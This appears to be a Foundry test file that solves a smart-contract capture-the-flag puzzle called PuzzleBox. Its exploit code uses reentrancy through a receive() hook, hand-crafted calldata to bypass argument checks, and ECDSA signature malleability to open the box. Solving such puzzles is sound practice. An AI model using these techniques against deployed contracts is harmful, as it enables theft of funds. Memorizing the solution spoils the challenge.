pragma solidity ^0.8.19;

import "./PuzzleBox.sol";
import "forge-std/Test.sol";

/// Basic solution (sans gas-optimizations)
/// Reference: https://gist.github.com/merklejerk/0f97d94a752c32edea0c01f464d0db97
contract PuzzleBoxSolution_V0 is Test {
    function solve(PuzzleBox puzzle) external {
        // How close can you get to opening the box?

        Operate operate = new Operate(puzzle, address(this));

        operate.callDrip();

        puzzle.leak();
        payable(address(uint160(address(puzzle)) + uint160(2))).transfer(1);
        puzzle.zip();

        puzzle.creep{gas: 98000}();

        uint256[] memory inputArray = new uint256[](6);
        inputArray[0] = 2;
        inputArray[1] = 4;
        inputArray[2] = 6;
        inputArray[3] = 7;
        inputArray[4] = 8;
        inputArray[5] = 9;
        bytes memory encodedDripIds = abi.encode(inputArray);
        console.logBytes(encodedDripIds);

        // 0x20 6 2 4 6 7 8 9
        // 0x20 0x100 0x20 6 2 4 6 7 8 9

        // (bool success,) = address(puzzle).call(abi.encodeWithSelector(puzzle.torch.selector, encodedDripIds));
        // require(success, "call failed");

        (bool success,) = address(puzzle).call(abi.encodePacked(
                            puzzle.torch.selector, uint256(0x01), uint8(0), encodedDripIds));
        require(success, "call failed");        

        address payable[] memory friends = new address payable[](1);
        uint256[] memory friendsCutBps = new uint256[](3);
        friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
        friendsCutBps[0] = uint160(bytes20(0xC817dD2a5daA8f790677e399170c92AabD044b57));
        friendsCutBps[1] = 0.015e4;
        friendsCutBps[2] = 0.0075e4;

        puzzle.spread(friends, friendsCutBps);

        uint256 SECP256k1N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        uint256 nonce = 0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8;
        uint256 r = uint256(0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8);
        uint256 s = SECP256k1N - uint256(0x625cb970c2768fefafc3512a3ad9764560b330dcafe02714654fe48dd069b6df);

        uint8 v = 27;
        bytes memory sign = abi.encodePacked(r, s, v);
        puzzle.open(nonce, sign);
    }
}

interface IPBProxy {
    function lock(bytes4 selector, bool isLocked) external;
}

contract Operate {
    PuzzleBox puzzle;
    address solution;
    uint256 counter;
    constructor(PuzzleBox _puzzle, address _solution) payable {
        puzzle = _puzzle;
        solution = _solution;
        puzzle.operate();
        IPBProxy(address(puzzle)).lock(bytes4(keccak256("torch(bytes)")), false);
    }

    function callDrip() external {
        puzzle.drip{value: 101}();
    }

    receive() external payable {
        if(counter < 9) {
            ++counter;
            puzzle.drip{value: 101}();
        } else {
            selfdestruct(payable(solution));
        }
    }
}
